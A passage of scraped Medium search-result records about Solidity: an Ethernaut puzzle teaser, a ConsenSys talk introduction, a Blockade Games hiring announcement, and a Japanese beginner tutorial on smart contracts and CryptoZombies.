"upvotes": "25", "content": "Ethernaut Lvl 17 Locked Walkthrough: How to properly use (and abuse) structs in\u00a0SolidityThis is a in-depth series around Zeppelin team\u2019s smart contract security puzzles. I\u2019ll give you the direct resources and key concepts you\u2019ll need to solve the puzzles 100% on your\u00a0own.Nicole ZhuBlockedUnblockFollowFollowingSep 17, 2018This levels requires you to unlock a registrar by abusing a poorly initiated struct.", "responses": ""}, {"title": "An introduction to Ethereum and Solidity with Dave\u00a0Hoover", "author_name": "ConsenSys", "link": "https://media.consensys.net/an-introduction-to-ethereum-and-solidity-with-dave-hoover-cb3fb7e43c5e?source=search_post", "post_date": "Jun 14, 2016", "readtime": "", "upvotes": "7", "content": "An introduction to Ethereum and Solidity with Dave\u00a0HooverConsenSysBlockedUnblockFollowFollowingJun 14, 2016On June 7th, veteran Educator Dave Hoover gave a talk at the Chicago Ruby meetup to demonstrate the Solidity programming language. This is an excellent introduction to the subjects of blockchain and Ethereum for experienced coders. Below the video is a PDF of the presentation.Diving into Ethereum and SolidityThank you to the Chicago Ruby group for filming the event.", "responses": ""}, {"title": "Randall Kanna joins Blockade Games as Solidity Developer for Neon District!", "author_name": "Chris Tannahill", "link": "https://medium.com/blockadegames/randall-kanna-joins-blockade-games-as-solidity-developer-for-neon-district-37a6dc6c204d?source=search_post", "post_date": "Oct 8, 2018", "readtime": "2 min read", "upvotes": "203", "content": "Randall Kanna joins Blockade Games as Solidity Developer for Neon District!Chris TannahillBlockedUnblockFollowFollowingOct 8, 2018Welcome to Neon District, Randall! And thanks to Marketing Lead, Alli Torres, for the image\u00a0edit!The Team at Blockade Games would like to extend a very warm welcome to Blockchain Engineer, Randall Kanna; the new Solidity Developer for Cyberpunk RPG, Neon District.Randall began coding at age 12. She recalls playing Neopets as her earliest exposure to the industry. \u201cI would build webpages every week for my Pirates of the Caribbean themed fan guild and figure out small ways to hack the site with my sister. They had digital currency on there and I still have a few million\u2026 Unfortunately it doesn\u2019t have the same value as Ethereum!\u201dRandall Kanna - Software EngineerSoftware Engineerwww.randallkanna.comRandall has been an avid gamer for as long as she can remember. She grew up surrounded by lots of computer games and her Sony PlayStation. Although she admits memory can be sweeter than reality at times. \u201cMy boyfriend and I recently [rediscovered] the PS One. We played some of the early games.. Let me just say, the image quality did not hold up.\u201dAfter completing an internship in college, Kanna got her first engineering job at a ticketing company. Since then she has also completed the B9 Academy Ethereum Developer Course. Combining her career path with her love of coding and experience with digital currencies, she has recently made the jump to fully focus on blockchain.When asked why she chose Neon District, Kanna responded, \u201cI think Marguerite (YT) is so amazing and inspiring. I actually quit my day job to work on this team. I was really excited by the idea and the passion that the team has about it. I\u2019ll be working on the Blockchain side of things in solidity.\u201dA very warm welcome, once again, to Randall Kanna!More from Randall, Blockade Games & Neon\u00a0DistrictRandall Kanna, Software EngineerBlockade Games WebsiteNeon District WebsiteTwitterFacebookInstagramWriter\u2019s note.As a writer of fact, fiction and pretty much anything else that tickles my fancy, I admire Randall for her abilities; if there\u2019s one thing I know I\u2019ll never be able to write, it\u2019s code.While I was piecing together this article, trying to copy-paste some links, I accidentally fat-fingered the keyboard shortcut to inspect elements. It scared the crap out of me. Coincidentally, that\u2019s about the extend of my coding experience to date.It\u2019s an absolute pleasure to have you on the team, Randall. Thanks for taking some time to share this part of your story with me and everyone on Medium!I look forward to seeing you hit home runs with all the \u201celements\u201d of blockchain I\u2019ll never fully understand!Chris Tannahill\u200a\u2014\u200aWriter @ Blockade Games", "responses": "1"}, {"title": "\u3010Ethereum\u306eSolidity\u8a00\u8a9e\u3011\u30af\u30ea\u30d7\u30c8\u30be\u30f3\u30d3\u30fc\u30ba\u30b2\u30fc\u30e0\u3067\u5b66\u3076\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8", "author_name": "\u91cc\u4e38(SATO___MARU)", "link": "https://salestechnologylab.com/ethereum%E3%81%AEsolidity%E8%A8%80%E8%AA%9E-%E3%82%AF%E3%83%AA%E3%83%97%E3%83%88%E3%82%BE%E3%83%B3%E3%83%93%E3%83%BC%E3%82%B2%E3%83%BC%E3%83%A0%E3%81%A7%E5%AD%A6%E3%81%B6%E3%82%B9%E3%83%9E%E3%83%BC%E3%83%88%E3%82%B3%E3%83%B3%E3%83%88%E3%83%A9%E3%82%AF%E3%83%88-40bcb79ddad8?source=search_post", "post_date": "Jan 25, 2018", "readtime": "11 min read", "upvotes": "64", "content": "\u3010Ethereum\u306eSolidity\u8a00\u8a9e\u3011\u30af\u30ea\u30d7\u30c8\u30be\u30f3\u30d3\u30fc\u30ba\u30b2\u30fc\u30e0\u3067\u5b66\u3076\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u91cc\u4e38(SATO___MARU)BlockedUnblockFollowFollowingJan 25, 2018Source: [Learn to Code Ethereum DApps By Building Your Own\u00a0Game]Ethereum\uff08\u30a4\u30fc\u30b5\u30ea\u30a2\u30e0\uff09\u306eSolidity\u3068\u3044\u3046\u8a00\u8a9e\u3067\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\uff08\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\uff09\u304c\u5b66\u3079\u308b\u30af\u30ea\u30d7\u30c8\u30be\u30f3\u30d3\u30fc\u30ba\uff08CryptoZombies\uff09\u3068\u3044\u3046\u30b5\u30fc\u30d3\u30b9\u304c\u51fa\u307e\u3057\u305f\u3002CryptoZombies - Learn to code games on Ethereum. Powered by Loom NetworkCryptoZombies is an interactive code school that teaches you to write smart contracts in Solidity through building your\u2026cryptozombies.io\u305d\u3082\u305d\u3082Solidity\u3068\u306f\u4f55\u304b\uff1f\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u306f\u4f55\u304b\uff1f\u305d\u308c\u306b\u4f34\u3046\u30b5\u30fc\u30d3\u30b9DApps\u3068\u306f\u4f55\u304b\uff1f\u3092\u8aac\u660e\u3057\u305f\u3042\u3068\u3067\u3001\u5b9f\u969b\u306b\u30af\u30ea\u30d7\u30c8\u30be\u30f3\u30d3\uff08CryptoZombies\uff09\u306e\u4f7f\u3044\u65b9\u3082\u3044\u304f\u3064\u304b\u89e3\u8aac\u3057\u3066\u3044\u304d\u307e\u3059\u3002\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\uff08Smart Contract\uff09\u3068\u306f\u305d\u306e\u307e\u307e\u7ffb\u8a33\u3059\u308b\u3068\u3001\u8ce2\u3044\uff08\u30b9\u30de\u30fc\u30c8\u306a\uff09\u5951\u7d04\uff08\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\uff09\u3068\u306a\u308a\u307e\u3059\u304c\u3001 \u7c21\u5358\u306b\u8a00\u3046\u3068\u300c\u81ea\u52d5\u7684\u306b\u57f7\u884c\u3067\u304d\u308b\u5951\u7d04\u30d7\u30ed\u30b0\u30e9\u30e0 \u300d\u306e\u3053\u3068\u3092\u7dcf\u79f0\u3057\u3066\u547c\u3093\u3067\u3044\u307e\u3059\u30021996\u5e74\u306bNick Szabo\uff08\u30cb\u30c3\u30af\u30fb\u30b9\u30b6\u30dc\uff09\u3068\u3044\u3046\u30b3\u30f3\u30d4\u30e5\u30fc\u30bf\u30fc\u30b5\u30a4\u30a8\u30f3\u30b9\u30fb\u6697\u53f7\u5b66\u8005\u30fb\u6cd5\u5b66\u8005\u306b\u3088\u3063\u3066\u63d0\u5531\u3055\u308c\u307e\u3057\u305f\u3002\u3053\u308c\u306f\u3053\u308c\u307e\u3067\u306e\uff13\u3064\u306e\u9769\u547d\uff08\u8fb2\u696d\u9769\u547d\u3001\u7523\u696d\u9769\u547d\u3001\u60c5\u5831\u9769\u547d\uff09\u306b\u5339\u6575\u3059\u308b\u7b2c\uff14\u306e\u9769\u547d\u3068\u307e\u3067\u8a00\u308f\u308c\u3066\u3044\u307e\u3059\u3002\u4ee5\u4e0b\u306e\u52d5\u753b\u3067Nick Szabo\uff08\u30cb\u30c3\u30af\u30fb\u30b9\u30b6\u30dc\uff09\u304c\u3001\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u306b\u3064\u3044\u3066\u8a71\u3057\u3066\u3044\u307e\u3059\u3002\u5b9f\u306f\u30c7\u30b8\u30bf\u30eb\u901a\u8ca8\u3092\u63d0\u5531\u3057\u305f\u306e\u3082\u3053\u306eNick Szabo\uff08\u30cb\u30c3\u30af\u30fb\u30b9\u30b6\u30dc\uff09\u3067\u30011998\u5e74\u306b\u306f\u30d3\u30c3\u30c8\u30b4\u30fc\u30eb\u30c9\uff08Bit Gold\uff09\u3068\u547c\u3070\u308c\u308b\u5206\u6563\u578b\u306e\u30c7\u30b8\u30bf\u30eb\u901a\u8ca8\u306e\u8a2d\u8a08\u3082\u767a\u8868\u3057\u307e\u3057\u305f\u3002\u5b9f\u306f\u3053\u306e\u30d3\u30c3\u30c8\u30b4\u30fc\u30eb\u30c9\uff08Bit Gold\uff09\u3068\u3044\u3046\u306e\u304c\u30d3\u30c3\u30c8\u30b3\u30a4\u30f3 \u306e\u5148\u99c6\u3051\u7684\u306a\u5206\u6563\u578b\u901a\u8ca8\u3068\u3055\u308c\u3066\u3044\u307e\u3059\u3002\u30d3\u30c3\u30c8\u30b3\u30a4\u30f3\uff08Bitcoin\uff09\u304b\u3089\u5206\u88c2\u3057\u305f\u30d3\u30c3\u30c8\u30b4\u30fc\u30eb\u30c9\uff08Bit Gold\uff09\u3068\u95a2\u4fc2\u3057\u3066\u3044\u308b\u306e\u304b\u306f\u3001\u5206\u304b\u308a\u307e\u305b\u3093\u3002\u5927\u8846\u306e\u4e2d\u3067\u306f\u3001\u3053\u306eNick Szabo\uff08\u30cb\u30c3\u30af\u30fb\u30b9\u30b6\u30dc\uff09\u3053\u305d\u3001Nakamoto Satoshi\u3067\u306f\u306a\u3044\u304b\u3068\u5642\u304c\u5e83\u307e\u308a\u307e\u3057\u305f\u304c\u3001Nick Szabo\uff08\u30cb\u30c3\u30af\u30fb\u30b9\u30b6\u30dc\uff09\u306f\u5426\u5b9a\u3057\u3066\u3044\u307e\u3059\u3002\u307e\u305fNick Szabo\uff08\u30cb\u30c3\u30af\u30fb\u30b9\u30b6\u30dc\uff09\u3068Hal Finney\uff08\u30cf\u30eb\u30fb\u30d5\u30a3\u30cb\u30fc\uff09\u304c\u30c1\u30fc\u30e0\u3067\u3084\u3063\u3066\u3044\u305f\u306e\u3067\u306f\u306a\u3044\u304b\u3068\u306e\u30b3\u30e1\u30f3\u30c8\u3082\u4ee5\u4e0b\u306eReddit\u3067\u3084\u308a\u3068\u308a\u3055\u308c\u3066\u3044\u307e\u3059\u3002Source:Why I think Nick Szabo is Satoshi Nakamoto\u00a0: Bitcoin\u200a\u2014\u200aReddit\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u306f\u81ea\u52d5\u8ca9\u58f2\u6a5f\uff1f\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u306b\u3088\u304f\u51fa\u3066\u304f\u308b\u4f8b\u3048\u306b\u300c\u81ea\u52d5\u8ca9\u58f2\u6a5f\u300d\u304c\u3042\u308a\u307e\u3059\u3002\u81ea\u52d5\u8ca9\u58f2\u6a5f\u3067\u884c\u3063\u3066\u3044\u308b\u4f5c\u696d\uff08\u30d7\u30ed\u30b0\u30e9\u30e0\uff09\u306f\u3001\u30e6\u30fc\u30b6\u30fc\u304c\u304a\u91d1\u3092\u6295\u5165\u3057\u3066\u3001\u8cb7\u3044\u305f\u3044\u5546\u54c1\u306e\u30dc\u30bf\u30f3\u3092\u62bc\u3059\u3002\u3053\u308c\u3067\u81ea\u52d5\u7684\u306b\u76ee\u7684\uff08\u5546\u54c1\u3092\u624b\u306b\u5165\u308c\u308b\uff09\u304c\u57f7\u884c\u3055\u308c\u307e\u3057\u305f\u3002\u30a4\u30e1\u30fc\u30b8\u306f\u4ee5\u4e0b\u3067\u3059\uff08\u30e6\u30fc\u30b6\u30fc\u306e\u7279\u5b9a\u306e\u5546\u54c1\u3092\u81ea\u52d5\u7684\u306b\u57f7\u884c\u3059\u308b\u884c\u70ba\uff09Solidity\uff08\u30bd\u30ea\u30c7\u30a3\u30c6\u30a3\uff09\u3068\u306f\u516c\u5f0f\u30b5\u30a4\u30c8\u306b\u3088\u308b\u3068\u3001solidity\u3068\u306f\u300c\u30a4\u30fc\u30b5\u30ea\u30a2\u30e0\u306e\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u3092\u5b9f\u88c5\u3059\u308b\u305f\u3081\u306e\u9ad8\u6c34\u6e96\u306a\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u6307\u5411\u8a00\u8a9e\u300d\u306b\u306a\u308a\u307e\u3059\u3002C ++\u3001Python\u3001JavaScript\u306e\u5f71\u97ff\u3092\u53d7\u3051\u3001Ethereum Virtual Machine\uff08EVM\uff09\u7528\u306b\u8003\u6848\u3055\u308c\u307e\u3057\u305f\u3002\u500b\u4eba\u7684\u306b\u3001iOS\u306eSwift\u3001C#\u3092\u30b3\u30fc\u30c7\u30a3\u30f3\u30b0\u3057\u305f\u7d4c\u9a13\u306e\u3042\u308b\u65b9\u3067\u3042\u308c\u3070\u6bd4\u8f03\u7684\u3001\u7c21\u5358\u306b\u66f8\u304f\u3053\u3068\u304c\u3067\u304d\u308b\u3068\u601d\u3044\u307e\u3059\u3002Solidity is a contract-oriented, high-level language for implementing smart contracts. It was influenced by C++, Python and JavaScript and is designed to target the Ethereum Virtual Machine (EVM).Soure:Solidity \u2014 Solidity 0.4.20 documentationDApps\uff08\u30c7\u30a3\u30fc\u30a2\u30c3\u30d7\u30b9\uff09\u3068\u306f\u4f55\u304bDApps\u3068\u306f\u3001Decentralized Applications\uff08DApps\uff09\u306e\u982d\u6587\u5b57\u3092\u3068\u3063\u305f\u7565\u8a9e\u3067\u3001\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u3092\u7528\u3044\u305f\u81ea\u7acb\u5206\u6563\u578b\u306e\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u3067\u3059\u3002DApps\u306e\u30b5\u30fc\u30d3\u30b9\u3068\u65e2\u5b58\u306e\u30b5\u30fc\u30d3\u30b9\u3068\u306e\u9055\u3044\u306f\u3001\u4e2d\u592e\u96c6\u6a29\u7684\u306a\u7ba1\u7406\u8005\u304c\u5b58\u5728\u3059\u308b\u304b\u5426\u304b\u306b\u3042\u308a\u307e\u3059\u3002\u4f8b\u3048\u3070\u65e2\u5b58\u30b5\u30fc\u30d3\u30b9\u306e\u4e2d\u3067\u63a2\u3057\u3066\u307f\u308b\u3068\u3001\u30bf\u30af\u30b7\u30fc\u914d\u8eca\u30a2\u30d7\u30ea\u306eUber\uff08\u30a6\u30fc\u30d0\u30fc\uff09\u3084\u3001\u6c11\u6cca\u306eAirbnb\uff08\u30a8\u30a2\u30d3\u30fc\u30a2\u30f3\u30c9\u30d3\u30fc\uff09\u306a\u3069\u306f\u3001\u4e2d\u592e\u96c6\u6a29\u7684\u306a\u7ba1\u7406\u8005\u3068\u3057\u3066\u5b58\u5728\u3057\u3066\u3044\u308b\u306e\u3067\u3001DApps\u3067\u306f\u3042\u308a\u307e\u305b\u3093\u3002\u3053\u308c\u3089\u306fDecentralized\uff08\u5206\u6563\u3001\u975e\u4e2d\u592e\u96c6\u6a29\uff1d\u30c7\u30a3\u30bb\u30f3\u30c8\u30e9\u30e9\u30a4\u30ba\u30c9\uff09\u306aApplication\uff08\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\uff09\u3067\u306f\u306a\u304f\u3001Centralized\uff08\u4e2d\u592e\u96c6\u6a29\u7684=\u30bb\u30f3\u30c8\u30e9\u30a4\u30ba\u30c9\uff09\u306a Application\uff08\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\uff09\u3068\u547c\u3070\u308c\u3066\u3044\u307e\u3059\u3002DApps\u306e\u5b9a\u7fa9Dapps\u306b\u306f\u3001\u4ee5\u4e0b\u306e4\u3064\u306e\u5b9a\u7fa9\u304c\u3042\u308a\u307e\u3059\u3002\u307e\u305a\u30aa\u30fc\u30d7\u30f3\u30bd\u30fc\u30b9\u3067\u63d0\u4f9b\u3055\u308c\u3066\u3044\u308b\u3053\u3068\u3002\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u306e\u30c7\u30fc\u30bf\u306f\u5b89\u5fc3\u5b89\u5168\u306b\u5206\u6563\u7684\u306b\u8a18\u9332\u4fdd\u5b58\u3055\u308c\u308b\u3053\u3068\u3002\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u306e\u30a2\u30af\u30bb\u30b9\u306b\u306f\u30c8\u30fc\u30af\u30f3\u3092\u5229\u7528\u3059\u308b\u3053\u3068\u3002\u53c2\u52a0\u8005\u30ce\u30fc\u30c9\u306b\u306f\u30d7\u30eb\u30fc\u30d5\u30fb\u30aa\u30d6\u30fb\u30ef\u30fc\u30af\uff08proof-of-work=PoW\uff09\u3092\u5831\u916c\u3068\u3057\u3066\u4e0e\u3048\u308b\u3053\u3068\u3002Soure:Decentralized Applications\u200a\u2014\u200adApps | Blockchain Hubb\u30af\u30ea\u30d7\u30c8\u30be\u30f3\u30d3\u30fc\u30ba\uff08CryptoZombies\uff09\u3067\u306f\u65e9\u901f\u30af\u30ea\u30d7\u30c8\u30be\u30f3\u30d3\u30fc\u30ba\uff08CryptoZombies\uff09\u306b\u3064\u3044\u3066\u7c21\u5358\u306b\u89e3\u8aac\u3057\u3066\u3044\u304d\u307e\u3059\u3002\u307e\u305f\u5168\u3066\u82f1\u8a9e\u3067\u66f8\u304b\u308c\u3066\u3044\u308b\u306e\u3067\u3001\u82f1\u8a9e\u3082\u5b66\u3073\u305f\u3044\u65b9\u306fSolidity\u8a00\u8a9e\u3068\u540c\u6642\u306b\u5b66\u3093\u3067\u307f\u3066\u304f\u3060\u3055\u3044\u3002\u30af\u30ea\u30d7\u30c8\u30be\u30f3\u30d3\u30fc\u30ba\uff08CryptoZombies\uff09\u306f\u5b8c\u5168\u306b\u7121\u6599\u3067\u521d\u5fc3\u8005\u306e\u305f\u3081\u306b\u3001\u697d\u3057\u307f\u306b\u306a\u304c\u3089\u30b2\u30fc\u30e0\u611f\u899a\u3067Solidity\u8a00\u8a9e\u3092\u5b66\u3079\u308b\u30b3\u30fc\u30c7\u30a3\u30f3\u30b0\u30b9\u30af\u30fc\u30eb\u3067\u3059\u3002\u5b9f\u969b\u306b\u7121\u6599\u3067\u4f7f\u3063\u3066\u307f\u307e\u3057\u305f\u3002\u4ee5\u4e0b\u306e\u5192\u982d\u306b\u3082\u7121\u6599\u3067\u521d\u5fc3\u8005\u3067\u3082\u7c21\u5358\u306b\u30b3\u30fc\u30c7\u30a3\u30f3\u30b0\u3067\u304d\u308b\u3068\u3042\u308a\u307e\u3059\u304c\u3001\u3082\u3057\u5b8c\u5168\u306bHTML\u3084CSS\u3001\u305d\u306e\u4ed6\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u8a00\u8a9e\u3092\u5b66\u7fd2\u3057\u305f\u3053\u3068\u306e\u306a\u3044\u65b9\u306b\u3068\u3063\u3066\u306f\u3001\u96e3\u3057\u3044\u3068\u601d\u3044\u307e\u3059\u3002\u305d\u306e\u5834\u5408\u3001\u65e5\u672c\u306e\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u5b66\u7fd2\u30b5\u30a4\u30c8\u3092\u7d42\u3048\u3066\u304b\u3089\u3001\u518d\u5ea6\u6311\u6226\u3059\u308b\u3053\u3068\u3092\u304a\u3059\u3059\u3081\u3057\u307e\u3059\u3002\u30af\u30ea\u30d7\u30c8\u30be\u30f3\u30d3\u30fc\u30ba\uff08CryptoZombies\uff09\u306e\u4f7f\u3044\u65b9\u624b\u9806\u2460\uff1a\u30af\u30ea\u30d7\u30c8\u30be\u30f3\u30d3\u30fc\u30ba\uff08CryptoZombies\uff09\u30b5\u30a4\u30c8\u306e\u300cGet Started, It\u2019s Free\u300d\u3092\u30af\u30ea\u30c3\u30af\u3057\u307e\u3059\u3002\u30da\u30fc\u30b8\u9077\u79fb\u3057\u305f\u3089\u300cLesson 1: Making the Zombie Factory\u300d\u3092\u30af\u30ea\u30c3\u30af\u3057\u307e\u3059\u3002GIF\u52d5\u753b\u3082\u53c2\u8003\u306b\u3057\u3066\u304f\u3060\u3055\u3044\u3002\u3059\u308b\u3068\u4ee5\u4e0b\u306e\u3088\u3046\u306a\u753b\u9762\u306b\u306a\u308a\u307e\u3059\u3002\u624b\u9806\u2461\uff1a\u7b2c\uff11\u7ae0\u30ec\u30c3\u30b9\u30f3\u306e\u6982\u8981\u304c\u66f8\u304b\u308c\u3066\u3044\u307e\u3059\u3002\u4e2d\u65ad\u306b\u306f\u30be\u30f3\u30d3DNA\u306e\u4ed5\u7d44\u307f\u3068\u66f8\u304b\u308c\u3066\u3044\u307e\u3059\u3002GIF\u52d5\u753b\u3082\u53c2\u8003\u306b\u3057\u3066\u304f\u3060\u3055\u3044\u3002\u81ea\u5206\u3067\u8272\u3005\u3044\u3058\u3063\u3066\u307f\u3066\u304f\u3060\u3055\u3044\u3002\u30be\u30f3\u30d3\u30ad\u30e3\u30e9\u30af\u30bf\u30fc\u306e\u72b6\u614b\u304c\u5909\u308f\u308a\u307e\u3059\u3002\u624b\u9806\u2462\uff1a\u300cNest Chapter\u300d\u3092\u30af\u30ea\u30c3\u30af\u3057\u307e\u3059\u3002\u7b2c\uff12\u7ae0\u3078\u79fb\u52d5\u3057\u305f\u3089\u3001\u3053\u3053\u304b\u3089\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u306e\u30b9\u30bf\u30fc\u30c8\u3067\u3059\u3002\u4ee5\u4e0b\u306b\u753b\u9762\u306e\u898b\u65b9\u306b\u3064\u3044\u3066\u89e3\u8aac\u3057\u3066\u3044\u307e\u3059\u3002\u624b\u9806\u2463\uff1a\u5b9f\u969b\u306b\u30b3\u30fc\u30c9\u3092\u624b\u9806\u306b\u6cbf\u3063\u3066\u304b\u3044\u3066\u307f\u307e\u3059\u3002GIF\u52d5\u753b\u3082\u53c2\u8003\u306b\u3057\u3066\u304f\u3060\u3055\u3044\u3002\u3059\u308b\u3068\u3001\u4ee5\u4e0b\u306e\u753b\u50cf\u53f3\u4e0b\u306e\u300c\u30d2\u30f3\u30c8\u8868\u793a\u90e8\u5206\u300d\u304c\u8d64\u304f\u306a\u308a\u307e\u3057\u305f\u3002\u3053\u308c\u306f\u3053\u306e\u3042\u305f\u308a\u304c\u9593\u9055\u3063\u3066\u3044\u308b\u3088\u3068\u89aa\u5207\u306b\u6559\u3048\u3066\u304f\u308c\u3066\u3044\u307e\u3059\u3002\u3053\u306e\u8d64\u304f\u5149\u3063\u305f\u90e8\u5206\u3092\u4fee\u6b63\u3059\u308c\u3070\u6b21\u3078\u9032\u3081\u308b\u3088\u3046\u306b\u306a\u308a\u307e\u3059\u3002\u5206\u304b\u3089\u306a\u3044\u5834\u5408\u306b\u306f\u3001\u5de6\u4e0b\u306b\u3042\u308b\u300cShow me the answer\u300d\u3092\u30af\u30ea\u30c3\u30af\u3059\u308c\u3070\u56de\u7b54\u304c\u898b\u3089\u308c\u307e\u3059\u3002\u3053\u306e\u3088\u3046\u306b\u3001\u521d\u6b69\u7684\u306a\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u3092\u30a4\u30fc\u30b5\u30ea\u30a2\u30e0\u306eSolidity\u8a00\u8a9e\u3092\u4f7f\u3063\u3066\u8aac\u660e\u3057\u3066\u3044\u307e\u3059\u3002\u624b\u9806\u2464\uff1a\u89e3\u7b54\u304c\u6b63\u3057\u304b\u3063\u305f\u5834\u5408\u306f\u3001\u4ee5\u4e0b\u306e\u3088\u3046\u306b\u30be\u30f3\u30d3\u304c\u99c6\u3051\u629c\u3051\u3066\u3044\u304d\u307e\u3059\u3002GIF\u52d5\u753b\u3092\u53c2\u8003\u306b\u3001\u4e2d\u592e\u306b\u51fa\u73fe\u3057\u305f\u300cVictory\u300d\u3092\u30af\u30ea\u30c3\u30af\u3057\u6b21\u306e\u7ae0\u3078\u9032\u307f\u307e\u3057\u3087\u3046\u3002\u3053\u306e\u3088\u3046\u306b\u3001\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u3092\u89e6\u308c\u305f\u3053\u3068\u306e\u3042\u308b\u65b9\u306b\u306f\u975e\u5e38\u306b\u7c21\u5358\u306b\u904a\u3079\u308b\u5185\u5bb9\u3067\u3059\u304c\u3001\u672a\u7d4c\u9a13\u8005\u306e\u65b9\u306b\u306f\u5c11\u3057\u96e3\u3057\u3044\u304b\u3082\u3057\u308c\u307e\u305b\u3093\u3002\u305d\u306e\u5834\u5408\u306f\u3001C ++\u3001Python\u3001JavaScript\u3092\u5b66\u7fd2\u3057\u3066\u307f\u308b\u3068\u826f\u3044\u3067\u3059\u3002\u500b\u4eba\u7684\u306b\u306f\u3001\u5192\u982d\u3067\u3082\u66f8\u304d\u307e\u3057\u305f\u304c\u3001iOS\u306eSwift\u3084Unity\u3067C#\u8a00\u8a9e\u3092\u4f7f\u3063\u305f\u3053\u3068\u306e\u3042\u308b\u65b9\u306b\u306f\u7c21\u5358\u306b\u30b3\u30fc\u30c7\u30a3\u30f3\u30b0\u3067\u304d\u308b\u3068\u601d\u3044\u307e\u3059\u3002\u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u6307\u5411\u306b\u3042\u305f\u308b\u30af\u30e9\u30b9\u306b\u4f3c\u305fContract\u3001\u30e1\u30bd\u30c3\u30c9\u3084\u95a2\u6570\u306b\u3064\u3044\u3066\u306f\u3001\u3053\u3061\u3089\u306e\u3010\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u6307\u5411\u8a00\u8a9e\uff1aSolidity\u3011\u306b\u3082\u8aac\u660e\u304c\u3055\u308c\u3066\u3044\u308b\u306e\u3067\u3001\u4e00\u5ea6\u8aad\u3093\u3067\u307f\u3066\u304f\u3060\u3055\u3044\u3002\u305d\u306e\u5f8c\u3067\u3001\u30af\u30ea\u30d7\u30c8\u30be\u30f3\u30d3\u30fc\u30ba\uff08CryptoZombies\uff09\u306b\u6311\u6226\u3057\u3066\u307f\u308b\u3068\u9762\u767d\u304f\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u306eSolidity\u8a00\u8a9e\u304c\u5b66\u3079\u307e\u3059\u3002\u6b21\u56de\u306f\u3001\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u3068\u30b7\u30a7\u30a2\u30ea\u30f3\u30b0\u30a8\u30b3\u30ce\u30df\u30fc\u306b\u3064\u3044\u3066\u66f8\u3044\u3066\u3044\u304d\u307e\u3059\u3002\u30c6\u30af\u30ce\u30ed\u30b8\u30fc\u95a2\u9023\u8a18\u4e8b2018\u5e743\u670827\u65e5\u306b\u300c\u3010\u521d\u5fc3\u8005\u5165\u9580\u3011\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u3092\u5b66\u3093\u3067\u611f\u3058\u305f\u304a\u3059\u3059\u3081\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u5b66\u7fd2\u30b5\u30a4\u30c8\u300d\u306b\u3064\u3044\u3066\u66f8\u304d\u307e\u3057\u305f\u3002\u3010\u521d\u5fc3\u8005\u5165\u9580\u3011\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u3092\u5b66\u3093\u3067\u611f\u3058\u305f\u304a\u3059\u3059\u3081\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u5b66\u7fd2\u30b5\u30a4\u30c8\u6628\u4eca\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u5b66\u7fd2\u306e\u30b5\u30fc\u30d3\u30b9\u3092\u63d0\u4f9b\u3059\u308b\u30b9\u30bf\u30fc\u30c8\u30a2\u30c3\u30d7\u304c\u52e2\u3044\u3092\u898b\u305b\u3066\u3044\u307e\u3059\u3002salestechnologylab.comFLOC\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u5927\u5b66\u6821\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306b\u3064\u3044\u3066\u5b66\u3073\u305f\u3044\u65b9\u306f\u3053\u3061\u3089\u3002\u7121\u6599\u4f53\u9a13\u30b3\u30fc\u30b9 | 